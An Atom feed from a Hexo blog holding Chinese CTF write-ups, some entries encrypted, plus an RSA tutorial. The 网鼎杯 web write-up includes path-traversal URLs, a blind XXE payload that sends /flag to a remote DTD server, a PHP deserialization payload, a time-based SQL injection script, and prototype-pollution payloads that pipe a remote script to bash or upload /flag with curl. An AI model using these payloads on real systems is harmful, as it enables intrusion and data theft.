<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-13T02:04:13.564Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>出题笔记（二）</title>
    <link href="http://yoursite.com/2020/05/12/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/12/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-05-12T01:41:29.000Z</published>
    <updated>2020-05-13T02:04:13.564Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d92ed89d90b87679f3356e4667f8e90005efe0291a6ff590627d84cd347f8c97"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯WEB题解</title>
    <link href="http://yoursite.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-10T23:52:07.000Z</published>
    <updated>2020-05-11T02:18:43.273Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    老高太强了 ，我躺躺了</p><h3 id="0x-02-filejava"><a href="#0x-02-filejava" class="headerlink" title="0x 02 filejava"></a>0x 02 filejava</h3><ul><li><p>考点</p><p>任意文件读取、CVE-2014-3529</p></li><li><p>解题过程</p></li></ul><ol><li>在文件下载功能进行目录穿越读取相关文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">根据xml信息依次读取：</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br></pre></td></tr></table></figure><p>反编译class文件进行代码审计，在upload里发现关键代码</p><p><img src="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/image-20200511080007882.png" alt></p><p>参考这篇文章：<a href="https://xz.aliyun.com/t/6996?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6996?tdsourcetag=s_pctim_aiomsg</a></p><p>构造盲XXE的xlsx文件进行文件读取</p><p>新建新建execl-1.xlsx文件，修改后缀名execl-1.xlsx.zip解压，然后在[Content_Types].xml添加payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>重新打包成<code>excel-1.xlsx</code>，注意文件名一定不能错，我就这样被坑掉了。</p><p>在服务器上新建一个<code>evil.etd</code>文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;xxxxx:9999&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>nc监听，上传文件触发payload，收到flag</p><h3 id="0x-02-AreUSerialz"><a href="#0x-02-AreUSerialz" class="headerlink" title="0x 02 AreUSerialz"></a>0x 02 AreUSerialz</h3><ul><li><p>考点</p><p>php反序列化bypass</p></li><li><p>解题过程</p></li></ul><p>序列化的字符串需要绕过<code>is_valid()</code>函数，因为<code>protected</code>类型的属性的序列化字符串包含不可见字符<code>\00</code>，会被<code>is_valid()</code>函数给ban掉，预期解法应该是是利用S来代替s，在这种情况下<code>\00</code>就会被解析成<code>%00</code>(1个字符)，而如果是小写s，<code>\00</code>就是一个斜线+2个零(3个字符)，在MRCTF中考到了这个考点。</p><p>另外反序列化的时候首先进入的是析构函数，会判断op属性的值如果不是“2”，如果是的话修改成“1”</p><p>但是在<code>process()</code>方法内有进行了判断<code>if ($this-&gt;op == &quot;2&quot;)</code>，两处存在差异可以使用弱类型比较绕过。文件读取需要使用相对路径一直打不通，需要使用绝对路径，首先读取/proc/self/cmdline</p><p>或者/etc/apache2/httpd.conf得到web根目录为/web/html,然后读取flag文件，最终exp为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;op &#x3D; 2;</span><br><span class="line">        $this-&gt;filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;web&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new FileHandler());</span><br></pre></td></tr></table></figure><p>payload修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:62:&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;web&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>非预期解法是利用php版本特性：php7.1+版本对属性类型不敏感，所以修改属性类型为public即可</p><p>补充：</p><p>相对路径的锅，之前D3CTF也有遇到，一直不知道原因，看了颖奇师傅的博客才懂了：<code>如果反序列化字符串没有异常就往前穿越到了根目录</code>，下面是照搬的笔记</p><p>为啥会穿越目录？这是析构方法的锅，请看官方Note：</p><blockquote><p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p><p>析构函数在脚本关闭时调用，此时所有的HTTP头信息已经发出。 脚本关闭时的工作目录有可能和在SAPI(如apache)中时不一样。 </p></blockquote><p>这种问题在开发中也出现，请参考<a href="https://www.cnblogs.com/thors/p/9559095.html" target="_blank" rel="noopener">这篇文章</a>给出的解决办法：</p><blockquote><p>1、在__destruct 中使用绝对路径操作文件</p><p>2、__destruct 之前比如构造函数内，先获取 getcwd() 工作目录，然后在 __destruct 中使用 chdir($StrPath)  重新设定工作目录。</p></blockquote><p>使用相对路径的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; file_get_contents($this-&gt;filename);</span><br></pre></td></tr></table></figure><p>会失败并且返回false，所以直接读取是不可以的；但是只要修改一下序列化字符串，比如删掉个符号，改错长度等等，这个<code>file_get_contents()</code>便不再返回false(绝对路径也不返回false)，也就能成功进行读取了</p><p>膜颖奇师傅,tql</p><h3 id="0x-03-trace"><a href="#0x-03-trace" class="headerlink" title="0x 03 trace"></a>0x 03 trace</h3><ul><li><p>考点</p><p>insert注入</p></li><li><p>解题过程</p></li></ul><p>存在insert注入，利用逻辑运算符和溢出报错来进行注入，这里用 pow(9999,100) ，这个表达式的值在 MYSQL 中已经超出 double 范围，会溢出。当我们比较结果为假时，就会执行到溢出语句，返回结果为 数据库操作失败 ；当我们比较结果为真时，执行sleep函数最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;43130fb576a44b6ba6d28e970fa02838061bf0e828f446dd.cloudgame1.ichunqiu.com&#x2F;register_do.php&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    for j in range(33, 127):</span><br><span class="line">        param &#x3D; &quot;2&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),pow(9999,100)),&#39;1&#39;)#&quot;.format(str(i), str(j))</span><br><span class="line">        # print param</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;username&#39;: param,</span><br><span class="line">            &#39;password&#39;: &#39;bb&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="0x-04-notes"><a href="#0x-04-notes" class="headerlink" title="0x 04 notes"></a>0x 04 notes</h3><ul><li><p>考点</p><p>原型链污染</p></li><li><p>解题过程</p></li></ul><p>审计代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.author&#39;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而undefsafe函数存在原型链污染，参考<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><p>在edit_note调用该函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#39;&#x2F;edit_note&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id &#x3D; req.body.id;</span><br><span class="line">        let author &#x3D; req.body.author;</span><br><span class="line">        let enote &#x3D; req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>在status路由存在命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#39;&#x2F;status&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands &#x3D; &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#39;&#x2F;bin&#x2F;bash&#39;&#125;, (err, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#39;OK&#39;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>通过原型链污染给commands增加父类属性从而命令执行。payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.a&amp;author&#x3D;curl http:&#x2F;&#x2F;xxxx&#x2F;shell.txt|bash&amp;raw&#x3D;hello world</span><br></pre></td></tr></table></figure><p>然后访问status触发原型链污染</p><p>颖奇师傅的教的payload。如果不能反弹shell的话外带flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.bb&amp;author&#x3D;curl -F &#39;flag&#x3D;@&#x2F;flag&#39; 174.1.58.51:9999&amp;raw&#x3D;a</span><br><span class="line"></span><br><span class="line">内容以符号 @ 开头，其后的字符串将被解析为文件名，curl 命令会从这个文件中读取数据发送</span><br><span class="line">-F&#x2F;--form 模拟表单提交</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    老高太强了 ，我躺躺了&lt;/p&gt;
&lt;h3 id=&quot;0x-02-filejava&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="YCTF" scheme="http://yoursite.com/tags/YCTF/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF题解</title>
    <link href="http://yoursite.com/2020/05/02/De1CTF%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/02/De1CTF%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-02T01:54:29.000Z</published>
    <updated>2020-05-06T15:58:11.003Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7d144536ef714cbfdec85df0cc57c301d972984e1211915c4c2c54d903c42154"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="De1CTF" scheme="http://yoursite.com/tags/De1CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF密码学中RSA学习以及总结</title>
    <link href="http://yoursite.com/2020/05/01/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADRSA%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/05/01/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADRSA%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</id>
    <published>2020-05-01T15:20:45.000Z</published>
    <updated>2020-05-02T00:47:16.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RSA简介"><a href="#RSA简介" class="headerlink" title="RSA简介"></a>RSA简介</h3><p>RSA密钥体制做个简略的介绍。</p><pre><code>1.选择两个大的参数，计算出模数 N = p * q2.计算欧拉函数 φ = (p-1) * (q-1)，然后选择一个e(1&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有1的两个整数）3.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。）4.对明文m进行加密：c = pow(m, e, N),可以得到密文c。5.对密文c进行解密：m = pow(c, d, N),可以得到明文m。</code></pre><p>整理：</p><pre><code>p 和 q：两个大的质数，是另一个参数N的的两个因子。N：大整数，可以称之为模数e 和 d：互为无反数的两个指数c 和 m：密文和明文(N, e)：公钥(N, d)：私钥pow(x, y, z)：效果等效pow(x, y)1 % z， 先计算x的y次方，如果存在另一个参数z，需要再对结果进行取模。密钥长度：n以二进制表示的的位数，例如密钥长度为512代表n用二进制表示的长度为512bit。dp≡dmod(p−1)dq≡dmod(q−1)</code></pre><p>RSA安全性分析</p><p>对于RSA加密算法，公钥(N, e)为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数N，然后计算欧拉函数φ(n)=(p-1) * (q-1),再通过d * e ≡ 1 mod φ(N)，即可计算出 d，然后就可以使用私钥(N, d)通过m = pow(c,d,N)解密明文。<br>保障RSA的安全性</p><pre><code>1.定期更换密钥2.不同的用户不可以使用相同的模数N3.p与q的差值要大，最好是差几个比特4.p-1与q-1都应该有大的素因子，一般建议选择的两个大素数p、q使得p=2p+1和q=2q+1也是素数5.e的选择不要太小6.d的选择也是不可以太小，最好满足d&gt;=n的4分之1</code></pre><h3 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h3><h4 id="0x-01-dp-dp泄露"><a href="#0x-01-dp-dp泄露" class="headerlink" title="0x 01 dp,dp泄露"></a>0x 01 dp,dp泄露</h4><p><strong>场景描述：</strong></p><p>假设题目仅给出p，q，dp，dq，c，即不给公钥e</p><p>这种参数是为了让解密的时候更快速产生的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp≡d%(p-1)</span><br><span class="line">dq≡d%(q-1)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RSA简介&quot;&gt;&lt;a href=&quot;#RSA简介&quot; class=&quot;headerlink&quot; title=&quot;RSA简介&quot;&gt;&lt;/a&gt;RSA简介&lt;/h3&gt;&lt;p&gt;RSA密钥体制做个简略的介绍。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.选择两个大的参数，计算出模数 N = p * q

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ISCC2020题解</title>
    <link href="http://yoursite.com/2020/05/01/ISCC2020%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/01/ISCC2020%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-01T00:06:50.000Z</published>
    <updated>2020-05-07T14:56:39.069Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="477f298956275342a6b8924cfd7a33f236b54e360276f09bb1b2fea7fa47877f">92ecdcfcff4b5dfe58a6c77169678fbf6c39f7e8ddebf40fef0ef7e0408c55739f551581c3ec1a1661c87fa8f5dd8b7bcb92464378f3bf79af5928763a15f1641d1d8c2bbbb28cde3bffbfba8bebbc84f0be661b75aa8886c0aa0cc059b68d22fa26805451c6403c8aaf4de9d896b291b473794cc469cf500c2d4d7c0dc9f4a376e80d20044cab4ee5da0fff97d26b9b13ed5cc1809130eb3c7790edbb477842efa7cfd1878d8ba22957fb37e15cedd7d3a9edb184b18cd1f16151050a2fbfd8598c1d8354ae19dc09e45723becd5f4a59b178cc8d01e1d7f6921f0f60ae3838aee8d44de21fd57dcaacdf23f7411955b6e372b12e31a7695725fe14a8ad7b305b50ab4a5eee4de048a316d0a04ad1c95ca3f35ea9df5024c1e9e2fe9a793e770986f3aae160d2e227f4aeac1059a19b09cc12de66da9172b43b917fcbbefbdb2017c27541c167adccfababd68e8f428a99da57f1f73bdabbf38c80fe8066eee04b0bb2e09c9532f908e82aa6ea75cefa21ff92343296e0ede15f58777597d94b098f96d802826dc9ca4bf9fd31e9eeacddbcf8134adbfe604882b9d2b8fd02ffe2c51533e64105a8fd13fe1c57d138493930d6327b700d649a5caa2670fbd3c1de869d71347694458a3ab3aab0548a7ff069b2bff454a536c6cc65724e8651672d6af75bd491ca56bf6b351d1d2c56de2a95f2650e00bd70f23f4068b53378adeb9c3954af9351109598c721902171637e7a0ab240ef5746f2513fd0386fc154e913b35c4ddf5b0a63e38655593a875bee56a2717cd059da6ef376f7c68c5800bd11893bd817f5d2ac45097cf877c3a1d03a983f4cc3a117eb1b2049727978d38046fde6a290fccb001460d45ef46e81008160a3ed62a895840f32d55c3e792a8991a73d6f048967e40fe8d94072ab8fba97864a87740f9c06e4d078d1290fcbc29dcc94205403e12440173854805cc349993fa2ba4fd7e05070d5ace4d481f7abcfc36bfd7f8b368cf9c791ae6dc65b35b18cd80af98e0f1e03c03a2233e939d1b449914181240eba67fe9ffca067d77ef73e72f803381f2ab3d36c292aa1b7c11fc8ec75ce32534d4e8c388a8f09afac46545cebe87d5bbc92e386f62a37e3be97f9115c18ec1fbbe49082d36aebcb09ceb3fa93b75335905f20ab9701070be65d05b0a8d3ecffe4817b556f01d9a16f6995b2cda3d7bdd1fb55656f795217b16b6c64c7561a4db8bdd40d065adec97a072cae9929a46f29d307206ee387df05291a152a0897813f5616b7ededcbd19b5aff82582e8dcb02676d10b0c8ae4a307d6b56f8af2427a552b1f1974c78a26e5708b5d76d7d531f1e9e622e8fe1f038ec40f9bec0ad8d50bc73e1c80867da866d7f529841f79359e2abd0df12ff28adac84f83d9fbb65830fa4f1782b4c5694f7f2da452cc850623bb95f6bbe459973d1091f0f43bd1a8c2957a1323cd7ef2487c38800018480d78c0ae4957e8612429ee8f5199ec9027b735d5b4b6c3a99b91534c4819656da31f92782e9b7a8ac3aa84c63f6c050cc57903332568c7757ece3a03dd503dd363bf0fc077eca74e273ba3614135ddf15d9de12c2745e5f93a667904c5b9bf056a837ea86637eded4402cb51d4e15debde38de8b612fc128a2c095e47ef7ee5d06838c88f5b8abdd25147529120d357d9040663a47dad7e8a8c57f3b61cd4702bc4ef4dba26e19ba6a0a0dee5f36c951432387056b4fdfd2d8d944d1586eebab6916fb374e9560bb9dc7cd5c09aca609f8d908ec7921e101f5595863f33cc2cf57896f58659579d5bffbc1dbfb571da3e43a7732b915be0bbe5b5dfd746eb59345f4071354719c73e605d6909d0e2c3824025b931f22c661dca3dd07e7212e4e3b5d73a8e3af7e8dbf702a0370b72fc6a27032e98a6928bec91c55e556dc80f33028801d7e959d203e4c9d1f4dd530290bf5d1aad39dd10adf7c158fb709d6cd840914363e43609c5d6092db8524b15271df0d4c39408993c78cd9cb5b11cfc039d1ffbfcba4f7f6fd92efbbbe2881847fc5a694006b6cfede0988f367d3af20ad441494421fc2e36c125fb7668ff169402913c9c5d439689a285d4bd4c05be1324ad558103b6c16f2bbd36aa1d82b6e49e0912ff98da21220c792025e414914bd89bd8e7c27a7f4605f4bb3d8b43ece49f42872646ec7cc669d6406f80e1c0a9341a12851589127fa1d1e17b421542282f9d134b67e41942d09f14ae14b6a925c614496cb8443fba682d8e7bad5e68f249380978de50dc513de6059e93a6cb773424050e71e1f38069197c2b3b94186a247c283663deb6b4685cc5998de0b8ba1b4823176909fb3ec48977b3545467e2261cfd714c6e35327fd69a4976f10b98ef98f9d7701ba02d4759a8879687ce15c91161144b8f23af9178c0eda3c3427e92fc4826e5778b6b970002abb6faddc153c8858451f5e7c19ddaacd680ec6e548b4b603cb865fe1bcfa9bce9b3635ca839f3f55c653a786e39cf1dec417b29857ff0afc471e8e0fc928c58d661c3f02b60832b2376f6b2a8e9dd5e913249b22dc5481c64a4ef47225cf6d70cb922be4b9e3c0ae27bca957f114b6e99f9159539987b32b4e6b765f3e4cf5d27e2963987611262ddec6530304157520702f56e9eb66471201b571bddb1001dfa17aaf7fa5ee80e583538d9f11513c404d166f2c2f0872a07b56650300a391dcf7f7cb6d034ad4ac6d6653d923eef37dc5edcd78c15d542e57f9fef177162ca57b1ba93fc6b1c35ab291fdeb17b445cd10738ad896dad6f093519413f6d69831771ea5a49b2073357a198cfbfaf29f3b30a1a5f37df392bb641d481f4103c24789adab77986444dc36503c96faa5cb9a7f082f01be14621550bc95af413a30465eb66e5c754af5a6a73c231804dff062831a379c97f69928da095194252d4571bd57fc87a35970aecd71d0e372f2218dae5ac96e49bd76614c98098c2e6657bd1c94ac7659aca82719eb06d64f6c9ce00ee2d5284dca58c3b67e494780fc2aaa8fe8a7a523ad40ba8985e5319c4c16590ec9b5d5d05142079bba75846db3d19b6ce7aecc564e75854da3760950bd0e2c3fb9f6b8282847a3a4348e37b65de38d871b58fb3b1aaa2c90ae4e54bd3a21dedd5a67cd0477b3b647ef835a34a19bf3ffa6e4011ddb7f0319ff3c213588ad40966a38491f645ff3935c2b256d2606a09011d4cd5d4e8cbd65d93915a011f534b04fce408864013ce1bcb43ae013b0ae93ed57d9116ca320328160f62c06dd9baa2c14bb60bc0102a20421c45ce7ff38502b90b90eb85b2fc4149ce9f32ceceba7f1cfcf384733b0d4dd55bbb31153f5b099f2aa2bb8d6ab4f006b69df73b1eef094674e0dfd8496d319042fbf89392849f0e9a6061daeab401332707caa7be204e664aeb6